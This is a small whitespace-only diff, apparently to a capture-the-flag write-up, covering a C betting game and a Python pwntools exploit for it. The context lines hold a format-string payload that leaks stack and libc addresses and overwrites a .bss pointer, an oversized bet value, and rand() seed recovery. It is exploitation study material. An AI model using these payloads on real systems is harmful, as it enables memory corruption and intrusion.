@@ -45,7 +45,7 @@ void game(PlayerObj *playerObj) {
     while (1) {
         printf("Round: %d\n", round);
         printf("Your money: %lu ZWD\n", *playerObj->amountMoney);
-	      printf("Your bet (= 0 to exit): ");
+	    printf("Your bet (= 0 to exit): ");
         choice = getChoice();
         rand_num = rand();
         printf("Lucky number: %u\n", rand_num);
@@ -150,7 +150,7 @@ def main():
     # We want the biggest amount of money possible!
     io.sendline(str(0x8000000000000000-1)) 
 
-	  io.recvuntil("Player name:")
+	io.recvuntil("Player name:")
     
     # Leak stack and libc addresses and overwrite `.bss` pointer, will explain in detail later!
     io.sendline("%88c%13$hhn|%10$p|%29$p")
@@ -222,6 +222,7 @@ def main():
             libc_so.rand()
             if rand_nums[i] == curr_rand:
                 count += 1
+                
         if count >= 5:
             real_seed = seed
             break
